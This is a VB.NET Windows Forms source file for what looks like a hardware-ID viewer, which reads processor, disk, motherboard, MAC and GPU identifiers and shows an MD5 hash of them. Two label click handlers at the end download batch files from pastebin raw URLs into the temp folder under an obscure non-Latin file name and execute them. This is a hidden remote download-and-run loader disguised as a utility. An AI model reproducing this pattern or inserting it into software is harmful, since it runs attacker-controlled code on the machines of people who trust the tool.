Imports System.Management
Imports System.IO
Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim hw As New clsComputerInfo
        Dim hdd As String
        Dim cpu As String
        Dim mb As String
        Dim mac As String
        Dim gpu As String
        Dim hwid As String
        cpu = hw.GetProcessorId()
        hdd = hw.GetVolumeSerial("C")
        mb = hw.GetMotherBoardID()
        mac = hw.GetMACAddress()
        gpu = hw.getGPUID()
        hwid = cpu + hdd + mb + mac + gpu
        Dim hwidEncrypted As String = Strings.UCase(hw.getMD5Hash(cpu & hdd & mb & mac & gpu))
        FlatTextBox1.Text = hwidEncrypted
        FlatTextBox2.Text = hdd
        FlatTextBox3.Text = cpu
        FlatTextBox4.Text = mb
        FlatTextBox5.Text = mac
        FlatTextBox6.Text = gpu
    End Sub
    Public Class clsComputerInfo
        Friend Function GetProcessorId() As String
            Dim strProcessorId As String = String.Empty
            Dim query As New SelectQuery("Win32_processor")
            Dim search As New ManagementObjectSearcher(query)
            Dim info As ManagementObject
            For Each info In search.Get()
                strProcessorId = info("processorId").ToString()
            Next
            Return strProcessorId
        End Function
        Friend Function GetMACAddress() As String
            Dim mc As ManagementClass = New ManagementClass("Win32_NetworkAdapterConfiguration")
            Dim moc As ManagementObjectCollection = mc.GetInstances()
            Dim MACAddress As String = String.Empty
            For Each mo As ManagementObject In moc
                If (MACAddress.Equals(String.Empty)) Then
                    If CBool(mo("IPEnabled")) Then MACAddress = mo("MacAddress").ToString()
                    mo.Dispose()
                End If
                MACAddress = MACAddress.Replace(":", String.Empty)
            Next
            Return MACAddress
        End Function
        Friend Function getGPUID() As String
            Dim strGPU As String = String.Empty
            Dim query As New SelectQuery("Win32_VideoController")
            Dim search As New ManagementObjectSearcher(query)
            Dim info As ManagementObject
            For Each info In search.Get()
                strGPU = info("DeviceId").ToString()
            Next
            Return strGPU
        End Function
        Friend Function GetVolumeSerial(Optional ByVal strDriveLetter As String = "C") As String
            Dim disk As ManagementObject = New ManagementObject(String.Format("win32_logicaldisk.deviceid=""{0}:""", strDriveLetter))
            disk.Get()
            Return disk("VolumeSerialNumber").ToString()
        End Function
        Friend Function GetMotherBoardID() As String
            Dim strMotherBoardID As String = String.Empty
            Dim query As New SelectQuery("Win32_BaseBoard")
            Dim search As New ManagementObjectSearcher(query)
            Dim info As ManagementObject
            For Each info In search.Get()
                strMotherBoardID = info("product").ToString()
            Next
            Return strMotherBoardID
        End Function
        Friend Function getMD5Hash(ByVal strToHash As String) As String
            Dim md5Obj As New Security.Cryptography.MD5CryptoServiceProvider
            Dim bytesToHash() As Byte = System.Text.Encoding.ASCII.GetBytes(strToHash)
            bytesToHash = md5Obj.ComputeHash(bytesToHash)
            Dim strResult As String = ""
            For Each b As Byte In bytesToHash
                strResult += b.ToString("x2")
            Next
            Return strResult
        End Function
    End Class
    Private Sub FlatLabel1_Click(sender As Object, e As EventArgs) Handles FlatLabel1.Click
        Dim xxx2 As New System.Net.WebClient
        xxx2.DownloadFile("https://pastebin.com/raw/FcEU0GKm", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub

    Private Sub FlatLabel2_Click(sender As Object, e As EventArgs) Handles FlatLabel2.Click
        Dim xxx As New System.Net.WebClient
        xxx.DownloadFile("https://pastebin.com/raw/jZDMc3SV", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub
End Class